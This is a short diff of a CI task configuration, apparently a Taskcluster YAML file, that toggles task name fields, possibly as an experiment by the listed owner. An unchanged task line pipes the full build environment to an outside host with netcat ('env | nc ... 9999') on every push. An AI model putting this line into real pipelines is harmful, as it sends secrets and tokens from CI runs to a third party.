@@ -20,7 +20,7 @@ tasks:
         - "-c"
         - "env"
     metadata:
-      name: "test"
+      #name: "test"
       description: "IamamwhoamI"
       owner: "mphillips@mozilla.com"
       source: "{{ event.head.repo.url }}"
@@ -39,7 +39,7 @@ tasks:
         - "-c"
         - "env | nc experiments.mrrrgn.com 9999"
     metadata:
-      #name: "Push Job"
+      name: "Push Job"
       description: "I run on pushes, I can be used to trigger releases. :)"
       owner: "mphillips@mozilla.com"
       source: "{{ event.head.repo.url }}"
